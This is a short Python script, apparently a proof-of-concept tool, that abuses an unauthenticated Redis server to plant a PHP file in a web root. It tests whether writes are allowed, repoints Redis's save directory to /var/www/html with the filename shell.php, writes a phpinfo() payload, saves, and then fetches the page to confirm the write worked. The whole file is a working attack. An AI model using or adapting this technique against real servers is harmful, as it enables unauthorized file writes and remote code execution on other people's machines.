#! /usr/bin/env python
# -*- coding: utf-8 -*-
# __author__ = "JrXnm"
# Date: 18-9-20

import redis
from redis.exceptions import *
import requests
import re
import traceback


class WebShell(object):
    def __init__(self, host, port=6379):
        self.conn = redis.Redis(host=host, port=port, decode_responses=True)
        self.host = host
        self.port = port

    def checkauth(self):
        try:
            self.conn.set('qwer', 12)
        except ResponseError as e:
            return 0, e.args[0]
        except ConnectionError:
            return 0, 'Connection refused'
        except Exception:
            traceback.print_exc()
        return 1, 'OK'

    def getwebroot(self):
        """Todo:爆破目录绝对路径"""
        return '/var/www/html'

    def getwebport(self):
        """Todo:获取web服务端口"""
        return 80

    def examweb(self):
        port = self.getwebport()
        url = 'http://' + self.host + ':' + str(port) + '/shell.php'
        r = requests.get(url)
        pa = re.compile(r'This program is free software;.*?PHP')
        res = pa.findall(r.text)
        if res:
            return True
        else:
            return False

    def setredis(self):
        check = self.checkauth()
        print(check)
        if not check[0]:
            return 0, check
        root = self.getwebroot()
        self.conn.config_set('dir', root)
        self.conn.config_set('dbfilename', 'shell.php')
        self.conn.set('-', '<?php phpinfo(); ?>')
        self.conn.save()

        ex = self.examweb()
        return ex, check


if __name__=='__main__':
    w = WebShell('127.0.0.1')
    exam, check = w.setredis()
    print(exam, check)




